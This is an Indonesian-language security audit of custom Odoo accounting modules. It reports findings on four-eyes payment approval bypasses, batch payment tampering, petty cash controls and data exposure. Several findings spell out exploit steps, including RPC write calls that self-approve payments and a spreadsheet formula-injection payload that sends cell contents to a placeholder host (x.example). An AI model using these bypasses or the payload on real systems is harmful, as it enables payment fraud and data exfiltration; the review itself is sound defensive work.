# Security Review — Port Accounting G57–G60 (2026-11-23)

Reviewer: efn-security-reviewer (read-only). Worktree `efn-platform-odoo`, branch `feat/odoo-completion`, kode belum di-commit.
Cakupan: `efn_account_asset`, `efn_petty_cash`, `efn_account_reconcile`, `efn_bank_import`, `efn_account_batch_payment`,
`efn_tax_withholding`, `efn_account_deferred`, `efn_account_localization`, dan entri G57–G60 di
`efn_core/tests/test_rpc_surface.py::RPC_ALLOWLIST`. Acuan: `docs/fit-gap/G57_G58_ACCOUNTING_PORT.md`,
`docs/fit-gap/G59_G60_ACCOUNTING_PORT.md`, CLAUDE.md, risk register `docs/01` (R-S10 insider, R-L01 PDP, R-L03 pajak).
Semua file (termasuk folder `data/`) bisa dibaca. Tidak ada test yang dijalankan; ini review statis.

## Ringkasan eksekutif

- Setiap tombol yang masuk allowlist memang memanggil cek grup, `check_access`, dan cek company **sebelum** `sudo()`. Record
  rule multi-company ada di semua model baru, dan view SQL rekonsiliasi kini dikelompokkan per company.
- **Dua kontrol uang keluar bisa dilewati lewat RPC `write` biasa (High).** (1) User Billing bisa menulis sendiri
  `efn_approval_state='approved'` lalu memposting pembayaran di atas ambang. (2) Satu Accounting Manager bisa memalsukan
  `validated_by_id` atau mengubah isi batch setelah divalidasi, lalu mengekspor file transfer sendiri. Atribut `readonly=True`
  hanya berlaku di UI.
- Lima temuan Medium: empat mata kas kecil tidak memeriksa penerima dana (`holder_partner_id`), status aset bisa diubah
  user non-manager, injeksi formula di ekspor XLSX, file transfer berisi nomor rekening terbaca semua pembaca batch, dan
  penyetuju pembayaran bisa mengedit pembayaran lalu menyetujuinya sendiri.
- Perbaikan yang disarankan kecil dan seragam: pola "system fields" yang sudah benar di `efn_petty_cash` (tulis hanya lewat
  `sudo()` + konteks, lihat `common.is_system_write`) diterapkan juga ke `account.payment` (G60), `efn.account.batch.payment`,
  dan `efn.account.asset`.

## Tabel temuan

| ID | Severity | Modul | Ringkas | File:baris |
|---|---|---|---|---|
| SEC-G60-01 | **High** | efn_account_localization | Field persetujuan pembayaran bisa ditulis pembuat lewat RPC, sehingga gerbang ambang 4-eyes bisa dilewati. Jalur pengecualian POS/transfer internal juga bisa dipalsukan | `models/account_payment.py:38-51, 68-88` |
| SEC-G58-01 | **High** | efn_account_batch_payment | `state`/`validated_by_id`/jejak ekspor bisa ditulis, dan isi batch masih bisa diubah setelah validasi, sehingga empat mata validasi ≠ ekspor tidak efektif | `models/efn_account_batch_payment.py:68-80, 138-200`; `models/account_payment.py:19-25` |
| SEC-G57-01 | Medium | efn_petty_cash | Empat mata tidak membandingkan penerima dana (`holder_partner_id`) dengan penyetuju/pencair/pemosting. Finance tidak dikecualikan bila menjadi penyunting | `models/petty_cash_request.py:489-515`; `models/petty_cash_realization.py:237-248` |
| SEC-G57-02 | Medium | efn_account_asset | `group_asset_user` bisa `create`/`write` `state='running'` (dan field disposal/merge/source) pada aset draft tanpa `_efn_check_manager` | `models/efn_account_asset.py:29, 715-754` |
| SEC-G57-03 | Medium | efn_petty_cash, efn_account_asset | Injeksi formula XLSX: `sheet.write()` xlsxwriter menjadikan teks berawalan `=` sebagai formula | `wizard/petty_cash_report_wizard.py:152-175`; `wizards/efn_asset_register_wizard.py:143-179` |
| SEC-G58-02 | Medium | efn_account_batch_payment | Attachment file transfer (nomor rekening lengkap terdekripsi) bisa dibaca dan diunduh semua user yang bisa membaca batch (Bookkeeper, auditor readonly) selama 24 jam, dan tampil di chatter | `models/efn_account_batch_payment.py:169-179` |
| SEC-G60-02 | Medium | efn_account_localization | Penyetuju boleh mengedit pembayaran `to_approve` (nominal, rekening tujuan) lalu menyetujuinya sendiri. Tidak ada himpunan penyunting (beda dengan pola SEC-157) | `models/account_payment.py:104-116, 141-154` |
| SEC-G58-03 | Low | efn_bank_import | Bookkeeper boleh `create` log impor langsung (memalsukan `imported_by_id`, atau menanam `file_hash` sehingga impor sah terblokir) | `security/ir.model.access.csv:5-6`; `models/efn_bank_import_log.py:51-55` |
| SEC-G58-04 | Low | efn_bank_import | `file` wizard = `fields.Binary` default `attachment=True`, sehingga mutasi asli (nama dan rekening lawan transaksi) tersimpan di filestore sampai transient vacuum | `wizard/efn_bank_import_wizard.py:57` |
| SEC-G58-05 | Low | efn_account_reconcile | Override blokir pembayaran ganda = centang `efn_duplicate_checked` oleh siapa pun yang bisa menulis payment, tanpa empat mata dan tanpa `efn.audit.rule` | `models/account_payment.py:17-22, 36-52` |
| SEC-G57-04 | Low | efn_petty_cash | `realization_deadline` bisa diubah pemegang di status apa pun, sehingga `block_when_overdue` bisa dihindari | `models/petty_cash_request.py:53-69, 129` |
| SEC-G58-06 | Low (PLAUSIBLE) | efn_account_batch_payment | Nomor rekening dibaca saat ekspor. Perubahan `res.partner.bank` atau `partner_bank_id` setelah validasi tidak terdeteksi (vektor pengalihan pembayaran) | `models/efn_account_batch_payment_format.py:103-127` |
| SEC-G5x-I1 | Info | efn_core | Deskripsi allowlist `("account.move","button_draft")` belum menyebut override `efn_account_asset` (hapus draf aset/un-post baris) dan `efn_account_reconcile` (unreconcile), padahal diwajibkan spec §1.7/§3.4 | `efn_core/tests/test_rpc_surface.py:478-481` |
| SEC-G5x-I2 | Info | efn_account_batch_payment | `verified` pada format bersifat global: manager PT A mencentang format untuk semua PT | `models/efn_account_batch_payment_format.py:53-57` |
| SEC-G5x-I3 | Info | efn_account_reconcile | Regex `amount_string` dari `account.reconcile.model` dieksekusi tanpa batas waktu (ReDoS oleh konfigurasi manager; dampak kecil) | `models/account_bank_statement_line.py:40-63` |
| SEC-G5x-I4 | Info | efn_petty_cash | `group_petty_cash_finance` meng-imply `account.group_account_invoice` (hak Billing penuh). Perlu disadari saat pemetaan persona, terutama selama SEC-G60-01 belum diperbaiki | `security/efn_petty_cash_groups.xml:30` |
| SEC-G5x-I5 | Info | efn_account_localization | `efn.audit.rule` untuk field persetujuan payment dan ambang company (spec §Ringkasan butir 5, `efn_setup_audit`) tidak ada di modul ini. Belum dicek di `efn_setup_audit` | — |

Jumlah: Critical 0 · High 2 · Medium 5 · Low 5 · Info 5.

---

## Detail temuan

### SEC-G60-01 (High): gerbang persetujuan pembayaran keluar bisa dilewati lewat RPC

**Lokasi:** `efn_account_localization/models/account_payment.py:38-51` (field), `:68-76` (`_efn_needs_approval`),
`:78-88` (`action_post`). Tidak ada override `write`/`create` di modul ini (grep `def write|def create` = 0).

**Masalah.**
1. `efn_approval_state`, `efn_approval_requested_by_id`, `efn_approved_by_id`, dan `efn_approved_at` adalah field biasa.
   Atribut `readonly=True` hanya berlaku di form. Siapa pun yang punya hak tulis `account.payment` (Billing,
   Bookkeeper, juga Finance kas kecil lewat SEC-G5x-I4) bisa menulisnya langsung.
2. `action_post` hanya memeriksa `efn_approval_state != 'approved'`.
3. Pengecualian gerbang memakai field yang juga bisa ditulis pembuat: `pos_session_id` dan
   `destination_account_id == company.transfer_account_id` tanpa syarat `partner_id == company.partner_id`.

**Eksploit.** User Billing membuat payment keluar Rp 500 jt (ambang Rp 50 jt), lalu
`call_kw account.payment.write([id], {"efn_approval_state": "approved", "efn_approved_by_id": <uid manager>})`, lalu
`action_post`. Payment terposting tanpa persetujuan. Voucher PDF bahkan mencetak nama manager di kolom "Disetujui"
(`payment_voucher_templates.xml:156`). Varian tanpa menulis field persetujuan: set `pos_session_id` ke sesi apa pun, atau
`destination_account_id` = akun transfer internal pada payment ke vendor. Hasilnya `_efn_needs_approval()` = False, dan
payment lolos ke batch transfer. Varian ini berstatus PLAUSIBLE: perilaku CE 19 untuk payment ber-akun-transfer dengan
partner vendor belum diuji.

**Rekomendasi.**
- Override `create`/`write` di `account.payment`. Buang (di `create`) atau tolak dengan `AccessError` (di `write`) setiap
  kunci `{efn_approval_state, efn_approval_requested_by_id, efn_approved_by_id, efn_approved_at}`, kecuali
  `env.su and env.context.get("efn_payment_approval_system")`. Pola ini sama dengan `efn_petty_cash/models/common.py:13`.
- Ganti semua penulisan field persetujuan menjadi `self.sudo().with_context(efn_payment_approval_system=True).write(...)`
  **setelah** cek berjalan, yaitu di `_efn_set_to_approve`, `action_efn_approve`, `action_efn_reject`, `action_draft`,
  dan `account_payment_register._post_payments`.
- Defense in depth di `action_post`: selain state `approved`, wajibkan `efn_approved_by_id` terisi dan bukan
  `create_uid` atau `efn_approval_requested_by_id`.
- Pengecualian POS hanya bila payment dibuat oleh alur tutup sesi. Caranya: set konteks `efn_pos_session_payment` di
  override `pos.session._create_bank_payment_moves`/`_create_combine_account_payment`, atau syaratkan `env.su` +
  `pos_session_id`. Pengecualian transfer internal hanya bila `paired_internal_transfer_payment_id`, atau bila partner =
  `company.partner_id` dan akun tujuan = akun transfer.
- Test: user Billing yang RPC `write efn_approval_state='approved'` mendapat `AccessError`; payment ber-`pos_session_id`
  palsu tetap tertahan.

**Risiko:** R-S10 (insider fraud), kontrol SoD G60 D-7.

### SEC-G58-01 (High): jejak empat mata batch pembayaran bisa dipalsukan, isi batch bisa diubah setelah validasi

**Lokasi:** `efn_account_batch_payment/models/efn_account_batch_payment.py:68-80` (state `compute` dengan `readonly=False`,
`validated_by_id`/`export_*` `readonly=True` UI saja), `:138-148`, `:150-200`, `:202-216`. ACL user dan manager = write
(`security/ir.model.access.csv:3-4`). Tidak ada override `write`. `account_payment.py:19-25`: `efn_batch_payment_id`
bebas ditulis.

**Eksploit A (satu orang).** Manager M membuat batch draft, lalu
`write({"state": "validated", "validated_by_id": <uid X>})`, lalu `action_generate_export_file`. Cek
`validated_by_id != env.user` lolos karena X ≠ M. File transfer terbit tanpa orang kedua.
`_efn_validate_payments` dijalankan ulang, tetapi itu cek data, bukan empat mata.

**Eksploit B (ubah isi).** Validator V memvalidasi batch berisi P1..P5. Manager M menambahkan P6 ke batch, lewat
`account.payment.write({"efn_batch_payment_id": batch})` atau `batch.write({"payment_ids": [(4, P6)]})`. Bisa juga M
mengganti `export_format_id`/`journal_id`, lalu mengekspor. V tidak pernah melihat P6.

**Rekomendasi.**
- `write`/`create` batch: field sistem `{state, validated_by_id, export_sha256, exported_by_id, exported_at, name}` hanya
  boleh ditulis lewat `sudo()` + konteks `efn_batch_payment_system` (setelah `_efn_check_group`). `state` jangan lagi
  `readonly=False` bila tidak diperlukan.
- Saat state ≠ `draft`, tolak perubahan `payment_ids`, `journal_id`, `batch_type`, `date`, dan `export_format_id`, baik di
  `efn.account.batch.payment.write` maupun di `account.payment.write` bila `efn_batch_payment_id` lama/baru menunjuk batch
  non-draft.
- Saat `action_validate`, simpan `efn_validated_digest` = sha256 dari daftar terurut
  `(payment.id, amount, currency, partner_bank_id.id)`. Di `action_generate_export_file`, hitung ulang dan tolak bila
  berbeda. Ini juga menutup SEC-G58-06 bila `acc_number` ikut di-hash.
- Test: manager yang RPC `write validated_by_id` mendapat `AccessError`; menambah payment ke batch `validated` ditolak.

**Risiko:** R-S10, spec G58 §5.3.

### SEC-G57-01 (Medium): empat mata kas kecil tidak mengecek penerima dana

**Lokasi:** `petty_cash_request.py:489-502` (`_efn_check_approver`: maker/editor/holder_user), `:504-515`
(`_efn_check_finance`: maker/holder_user saja), `petty_cash_realization.py:237-248`. `holder_partner_id` adalah field isi
yang bebas diisi saat draft, sedangkan `holder_user_id` opsional (Q-PC5) (`:80-96`).

**Eksploit.**
- Staf outlet U membuat uang muka dengan `holder_partner_id` = partner milik Approver A dan `holder_user_id` kosong. A
  menyetujui, karena A bukan maker/editor/holder_user.
- Varian Finance: Finance F mengedit pengajuan draft milik U (F menjadi editor) dengan `holder_partner_id` = partner F dan
  `holder_user_id` = False. Approver lain menyetujui, lalu F mencairkan, karena `_efn_check_finance` tidak mengecualikan
  editor maupun penerima.
- Spec K-PC2: "pemohon/penerima/penyunting ≠ penyetuju; pencair ≠ pemohon/penerima".

**Rekomendasi.** Di ketiga helper, tambahkan penolakan bila
`user.partner_id.commercial_partner_id == rec.holder_partner_id.commercial_partner_id`. Di `_efn_check_finance`,
kecualikan juga `editor_ids`, sama dengan approver. Tambahkan test: penyetuju = partner penerima mendapat `UserError`, dan
Finance-penyunting yang mencairkan mendapat `UserError`. Risiko: R-S10.

### SEC-G57-02 (Medium): status aset bisa diubah user non-manager

**Lokasi:** `efn_account_asset.py:715-730` (`create` tidak membuang `state`) dan `:732-742` (`write` hanya mengunci bila
aset **sudah** non-draft). `NON_DRAFT_WRITABLE` ada di `:29`. ACL `group_asset_user` = `rwc-`.

**Eksploit.** User Aset memanggil `create({..., "state": "running"})` atau `write({"state": "running"})` pada aset draft.
Aset "berjalan" tanpa konfirmasi manager dan tanpa jadwal. Nilai perolehan atau `opening_accumulated_depreciation` yang
diisi user ikut terkunci dan menjadi basis disposal/revaluasi. User juga bisa mengisi `source_move_line_id` ke baris
tagihan lain. Bila aset itu `running`, `button_draft` tagihan tersebut ditolak (`account_move.py:77-89`), sehingga user
bisa memblokir reset tagihan orang lain. Hal yang sama berlaku untuk `merged_into_id`, `disposal_*`, `revaluation_*`, dan
`retired_*`.

**Rekomendasi.** Definisikan `SYSTEM_FIELDS = {state, merged_into_id, source_move_line_id, disposal_*, revaluation_value,
revaluation_surplus_balance, revaluation_loss_recognized, retired_*}`. Buang field ini di `create` dan tolak di `write`
bila `not env.su`. `action_confirm` (`:412`) menulis state lewat `sudo()` setelah `_efn_check_manager`, sama seperti
`action_cancel`/`action_reset_draft`. Pembuatan dari tagihan (`account_move.py:56`) sudah memakai sudo. Tambahkan test:
user Aset RPC `write state` mendapat `AccessError`. Risiko: R-S10.

### SEC-G57-03 (Medium): injeksi formula pada ekspor XLSX

**Lokasi:** `efn_petty_cash/wizard/petty_cash_report_wizard.py:152,168,175` dan
`efn_account_asset/wizards/efn_asset_register_wizard.py:143,172-179`. Keduanya memakai `xlsxwriter.Workbook(buf,
{"in_memory": True})` lalu `sheet.write(row, col, value)`. Dengan opsi default (`strings_to_formulas=True`), xlsxwriter
menulis string berawalan `=` sebagai **formula**. Opsi default `strings_to_urls=True` juga mengubah teks bertipe URL
menjadi hyperlink.

**Eksploit.** Kustodian outlet mengisi keterangan baris realisasi `=HYPERLINK("https://x.example/?d="&B5&C5,"Nota")`.
Teks itu menjadi `account.move.line.name` lewat `_efn_post_expense_entry`, lalu muncul di Kartu Uang Muka XLSX yang
dibuka Finance. Nama aset dari baris tagihan vendor (input Billing) juga masuk ke Daftar Aset. Formula bisa menjalankan
DDE/WEBSERVICE di Excel, tergantung pengaturan keamanan klien.

**Rekomendasi.** `xlsxwriter.Workbook(buf, {"in_memory": True, "strings_to_formulas": False, "strings_to_urls": False})`
di kedua wizard. Bisa juga menulis sel teks dengan `sheet.write_string`. Tambahkan test: string berawalan `=` terbaca
sebagai string, bukan formula (cek `book.worksheets()[0]` atau unzip XML sel `t="s"`/`inlineStr`). Risiko: R-S10/R-L01.

### SEC-G58-02 (Medium): file transfer 24 jam terbaca semua pembaca batch

**Lokasi:** `efn_account_batch_payment.py:169-179`: `ir.attachment` dengan `res_model`/`res_id` = batch. Akses attachment
CE mengikuti hak **baca** record induk, yaitu `account.group_account_readonly` dan `account.group_account_user`
(`ir.model.access.csv:2-3`) di company yang sama. Attachment yang tertaut ke record juga tampil di kotak lampiran
chatter.

**Dampak.** Auditor readonly atau Bookkeeper mana pun bisa mengunduh CSV berisi nomor rekening dan nama penerima lengkap
(data pribadi vendor perorangan/karyawan, terdekripsi dari `efn_pii`) selama 24 jam. Padahal spec §5.2 menyebut "cek
grup", dan hanya manager yang boleh mengekspor.

**Rekomendasi (pilih satu).**
- (a) Buat attachment **tanpa** `res_model`/`res_id`, dengan `public=False` dan `description=EXPORT_MARKER`. Di CE,
  attachment tak tertaut hanya bisa dibaca `create_uid` dan admin. GC tetap mencari lewat `description`. Simpan id batch
  di `res_name`/`name`.
- (b) Pakai field `efn_export_file = fields.Binary(attachment=True, copy=False, groups="account.group_account_manager")`
  dan unduh lewat `/web/content/efn.account.batch.payment/<id>/efn_export_file`. Attachment ber-`res_field` disembunyikan
  dari chatter dan dicek grup field-nya. GC mengosongkan field.

Tambahkan test: user `group_account_user` gagal membaca attachment ekspor. Risiko: R-L01 (UU PDP), ADR-022.

### SEC-G60-02 (Medium): penyetuju bisa menyunting lalu menyetujui pembayaran

**Lokasi:** `account_payment.py:104-116, 141-154`. Empat mata hanya membandingkan dengan `efn_approval_requested_by_id` dan
`create_uid`. Payment `to_approve` masih `draft`, sehingga field isi (amount, partner, `partner_bank_id`, journal, date,
`destination_account_id`) tetap bisa diedit siapa pun yang punya hak tulis, termasuk calon penyetuju.

**Eksploit.** Accounting Manager M2 mengubah `partner_bank_id` payment `to_approve` ke rekening lain (atau menaikkan
nominal), lalu `action_efn_approve`. Lolos, karena M2 bukan peminta maupun pembuat. Isi final hanya diputuskan satu orang.

**Rekomendasi.** Di override `write` (lihat SEC-G60-01): bila payment berstatus `to_approve`/`approved` dan kunci isi di
atas berubah, kembalikan ke `not_required` (wajib minta ulang). Alternatifnya, catat `efn_editor_ids` dan kecualikan
mereka di `_efn_check_approver` (pola `efn_loyalty_accounting` SEC-157). Tambahkan test.

### SEC-G58-03 (Low): log impor bisa dibuat langsung oleh Bookkeeper

`efn_bank_import/security/ir.model.access.csv:5-6` memberi `perm_create` ke user dan manager. Guard di
`efn_bank_import_log.py:51-55` hanya ada di `write`. Akibatnya user bisa membuat log palsu dengan `imported_by_id` = orang
lain dan `state='imported'`. User juga bisa menanam `file_hash` sebuah file, sehingga impor sah ditolak "sudah pernah
diimpor" (bisa dipulihkan dengan arsip). **Fix:** `perm_create=0` untuk user dan manager (wizard sudah menulis log via
`sudo()`, `efn_bank_import_wizard.py:116`). Alternatifnya, override `create` yang menolak bila `not env.su` dan memaksa
`imported_by_id = env.uid`.

### SEC-G58-04 (Low): file mutasi tersimpan sementara di filestore

`efn_bank_import_wizard.py:57`: `fields.Binary(...)` tanpa `attachment=False` berarti tersimpan sebagai `ir.attachment` di
filestore yang belum terenkripsi, sampai record transient dibersihkan. Ini bertentangan dengan janji "file asli tidak
disimpan" (README, spec §8). **Fix:** `attachment=False`, sehingga isi file disimpan di kolom tabel transient yang ikut
dibersihkan vacuum.

### SEC-G58-05 (Low): override pembayaran ganda tanpa kontrol

`efn_account_reconcile/models/account_payment.py:17-22, 36-52`. Pembuat sendiri boleh mencentang
`efn_duplicate_checked`, tanpa empat mata, tanpa jejak `efn.audit.rule`, dan tanpa `copy=False` pada... (field sudah
`copy=False`, OK). Cakupan pencarian kembaran = `_fetch_duplicate_reference` CE (per company, partner, nominal, tanggal),
jadi tidak bisa dipakai lintas PT dan tidak menimbulkan DoS global. Satu-satunya "blokir" yang bisa dipicu user lain
adalah memposting kembaran sendiri, yang butuh hak posting. **Fix:** tambahkan `efn.audit.rule` untuk
`account.payment.efn_duplicate_checked`. Opsional: centang override hanya boleh oleh `account.group_account_manager`, atau
oleh penyetuju G60 bila payment di atas ambang.

### SEC-G57-04 (Low): tenggat realisasi bisa diubah pemegang

`realization_deadline` (`petty_cash_request.py:129`) tidak termasuk `CONTENT_FIELDS`/`SYSTEM_FIELDS` (`:40-69`). Pemegang
(rule "milik sendiri" + ACL write) bisa memundurkan tenggatnya setelah pencairan, sehingga `block_when_overdue` dan
pengingat cron tidak berlaku. **Fix:** masukkan ke `SYSTEM_FIELDS` (diisi `action_disburse`), atau izinkan ubah hanya untuk
grup Finance.

### SEC-G58-06 (Low, PLAUSIBLE): rekening penerima tidak dibekukan saat validasi

`_efn_rows` (`efn_account_batch_payment_format.py:103-127`) membaca `partner_bank_id.acc_number` saat ekspor. Bila
rekening partner diubah (oleh siapa pun yang berhak menulis `res.partner.bank`) atau `partner_bank_id` payment diganti
setelah validasi, file memakai rekening baru tanpa peringatan. **Fix:** sertakan `acc_number` ke digest validasi
(SEC-G58-01), dan/atau wajibkan `partner_bank_id.allow_out_payment` (rekening terverifikasi CE) untuk semua payment batch.

### Info

- **I1:** perbarui deskripsi allowlist `button_draft` (`test_rpc_surface.py:478-481`) dengan `efn_account_asset` (tolak
  bila aset running; hapus draf aset via sudo; un-post baris penyusutan) dan `efn_account_reconcile` (unreconcile
  sebelum super).
- **I2:** pertimbangkan `verified` per company (pindah ke `efn.account.batch.payment.format.company`).
- **I3:** regex model rekonsiliasi berasal dari konfigurasi manager. Dampaknya hanya CPU worker. Terima, atau batasi
  panjang pola.
- **I4:** `group_petty_cash_finance` meng-imply Billing. Dokumentasikan di `efn_setup_role`.
- **I5:** pastikan `efn.audit.rule` untuk `account.payment` (field persetujuan) dan `res.company.efn_payment_approval_threshold`
  benar-benar ditambahkan di `efn_setup_audit` (spec G59/G60 urutan 5).

---

## Verifikasi entri RPC_ALLOWLIST G57–G60

Semua method yang terdaftar memanggil cek sebelum `sudo()` apa pun dan membatasi ke company aktif/diizinkan:

| Entri | Cek yang ditemukan | Status |
|---|---|---|
| `account.move.action_efn_open_deferred_entries` | `ensure_one` + `check_access('read')`, act_window tanpa sudo (`efn_account_deferred/models/account_move.py:51-62`) | OK |
| `efn.account.asset.*` (confirm/cancel/reset/post_selected/open_*_wizard) | `_efn_check_manager` = grup manager + `check_access('write')` + `company_id ⊆ env.companies` (`efn_account_asset.py:322-329`), dipanggil di baris pertama | OK (lihat SEC-G57-02 untuk `write` langsung) |
| `efn.account.asset.action_view_*` | `check_access('read')` (`:469-478`) | OK |
| `efn.account.asset.group.action_efn_reseed` | `efn_check_asset_manager` lalu seed hanya `env.companies` ber-CoA id (`efn_account_asset_group.py:153-157`) | OK |
| `…depreciation.line.action_post_now/action_reverse` | `asset_id._efn_check_manager()` | OK |
| wizard disposal/revaluation/partial/post | `asset._efn_check_manager()`; post: `companies ∩ env.companies` | OK |
| `…register.wizard.action_xlsx/action_pdf` | `_efn_check_access` di `_efn_register_data` (juga terpanggil saat render QWeb langsung via `/report`) | OK (lihat SEC-G57-03) |
| `efn.petty.cash.request.*`, `…realization.*`, `…fund.*`, `…type.action_view_requests` | `check_access` + state; approve/reject `_efn_check_approver`; disburse/return/reimburse/settle `_efn_check_finance`; post `_efn_check_poster`; close `_efn_check_finance`; replenish = holder/Finance | OK (lihat SEC-G57-01) |
| `efn.petty.cash.report.wizard.action_xlsx/pdf` | `_efn_check_access` (grup + company ∈ `env.companies`) di `_efn_data` (juga dipanggil template PDF) | OK |
| `account.bank.statement.line.action_efn_*` | `_efn_check_reconcile_access` (grup user + `check_access('write')` + company) | OK |
| `efn.bank.reconcile.wizard.*` | `_efn_check`; `action_reconcile` memvalidasi ulang kandidat via `filtered_domain` + `check_access('read')`; model rekonsiliasi dicek company/jurnal | OK |
| `efn.account.reconcile.wizard.default_get/action_reconcile` | `_efn_validate_lines` di keduanya (line_ids hasil RPC divalidasi ulang) | OK |
| `efn.reconcile.account.init/action_open_lines` | SQL statis, `SQL.identifier`, tanpa input; `GROUP BY ml.company_id` + rule company; action tanpa sudo | OK |
| `efn.bank.import.wizard.action_import` | `_efn_check_access` (grup, baca jurnal, create baris, company, template satu company) sebelum `Log.sudo()` | OK |
| `efn.account.batch.payment.*`, `account.payment.action_efn_create_batch` | `_efn_check_group` (grup + `check_access` + company) | Cek ada, tetapi **empat mata bisa dilewati via write** (SEC-G58-01) |
| `account.payment.action_post` (reconcile + G60) | duplikat via CE `_fetch_duplicate_reference`; gerbang ambang | **Bisa dilewati** (SEC-G60-01) |
| `account.payment.action_draft` | `super()` lalu gugurkan persetujuan | OK |
| `account.payment.action_efn_request_approval/approve/reject` | `check_access('write')` + `company ⊆ user.company_ids` + state + 4-eyes (peminta/pembuat) | OK sebagian (SEC-G60-02) |
| `efn.outlet.analytic.wizard.action_check/apply` | `_efn_check_access` (manager + company ∈ `user.company_ids`) sebelum sudo | OK |

## Perbaikan keamanan wajib dari spec: status implementasi

| Spec | Butir | Status |
|---|---|---|
| G57 §0/§1.6 | `company_id` + rule global semua model; tanpa ACL `base.group_user`; grup tanpa `user_ids` admin | Terimplementasi |
| G57 §1.3 butir 9 | sudo hanya untuk create draf aset setelah cek `company ∈ env.companies` | Terimplementasi (`account_move.py:41-66`) |
| G57 §1.6 | kontrol status di server; non-draft hanya name/location/custodian/note | **Sebagian**: draft → state lain bisa via write (SEC-G57-02) |
| G57 §2.2 K-PC2/K-PC3 | empat mata; `post_init_hook` dibuang | **Sebagian**: penerima tidak dicek (SEC-G57-01); hook dibuang |
| G57 §2.5 | rule "Finance all" tanpa batas company diganti | Terimplementasi (rule grup + rule global company) |
| G58 §3.1 | view SQL per company; `skip_reconciliation_guard` hanya `env.su`; blokir duplikat via CE | Terimplementasi |
| G58 §3.4 | cek grup pada `action_efn_auto_match` dkk. | Terimplementasi |
| G58 §4.2 | lock date fail-closed (fiscalyear + hard); dedup per company + fingerprint; encoding ketat; batas ukuran/baris; error tanpa isi sel; parser privat | Terimplementasi (catatan SEC-G58-04 untuk file transient) |
| G58 §5.2 | CSV via modul `csv` + sanitasi + prefiks formula; fail-closed keyring/placeholder/non-digit; file tidak permanen (24 jam, cron per jam); renderer privat | Terimplementasi (catatan SEC-G58-02 untuk akses attachment) |
| G58 §5.3 | empat mata validator ≠ pengekspor; cek persetujuan G60 bila field ada | **Bisa dilewati** (SEC-G58-01) |
| G59-A | NPWP via ORM (related, `groups` akuntansi), tanpa SQL view; tulis bupot hanya grup akuntansi | Terimplementasi |
| G59-B | analitik terbawa; lock date tidak dilewati di `button_draft` | Terimplementasi |
| G60-A | 4-eyes approve; voucher tanpa `attachment`; masking rekening untuk non-manager | **Gerbang bisa dilewati** (SEC-G60-01/02); laporan & masking OK |
| G60-B | pencarian tarif difilter company metode; MDR gagal tidak memblok tutup sesi; log tanpa PII | Terimplementasi |
| G60-C | wizard cek manager + company sebelum sudo; analitik di-imply dari Billing (Q-G60-9) | Terimplementasi |

## Kontrol yang sudah benar (untuk manajemen)

- **Multi-company:** setiap model baru punya `company_id` + record rule global. `_check_company_auto`/`check_company` ada
  di relasi. View SQL ringkasan rekonsiliasi tidak lagi menjumlah nilai lintas PT.
- **sudo terkendali:** pola "system fields" di kas kecil (`env.su` + konteks; konteks dari RPC saja ditolak) sudah tepat,
  dan pola ini yang direkomendasikan untuk G58/G60. Cron (aset, kas kecil, GC file) berjalan lintas company, tetapi selalu
  `with_company` per record dan tidak mengembalikan data ke user.
- **Lock date:** impor mutasi menolak seluruh file (fail-closed). Bypass `BYPASS_LOCK_CHECK` sumber dibuang. Deferred
  menolak reset bila entri turunan ada di periode terkunci. Write-off/rekonsiliasi memakai hak user, sehingga lock date CE
  tetap berlaku.
- **PII:** log tanpa nama, nomor rekening, atau isi narasi (hanya id/hitungan). Ekspor transfer fail-closed bila keyring
  `efn_pii` terkunci, tanpa pernah menulis placeholder. Rekening dimasking di list batch dan voucher (non-manager). NPWP
  hanya lewat ORM untuk grup akuntansi. `sample_file` template dibuang.
- **Injeksi:** CSV transfer aman (modul `csv`, whitelist karakter, prefiks formula). SQL view statis dengan
  `SQL.identifier`. Tidak ada `t-raw`/`Markup` di QWeb baru (semua `t-out`). Parser impor dan renderer batch privat
  (tidak RPC-callable).
- **Kepatuhan port:** tanpa dependency `hr`/`custom_*`. `post_init_hook` pemberi grup massal dibuang. Grup baru tanpa
  `user_ids` admin default.

## Belum terverifikasi

- Perilaku CE 19 untuk payment vendor dengan `destination_account_id` = akun transfer internal (varian SEC-G60-01), serta
  apakah `pos_session_id` bisa ditulis tanpa batasan tambahan dari `point_of_sale`.
- Cakupan persis `_fetch_duplicate_reference` CE 19 (diasumsikan per company/partner/nominal/tanggal).
- Keberadaan `res.company._get_lock_date_violations(date, sale=, purchase=, tax=)` dengan signature tersebut di CE 19
  (`efn_account_deferred/models/account_move.py:203`). Bila salah, `button_draft` tagihan ber-tangguhan gagal
  (fungsional, bukan celah).
- Ekspor list CE (`/web/export/xlsx`) dari Daftar Pemotongan PPh (NPWP) dan apakah tertangkap `efn_audit` (spec [B]).
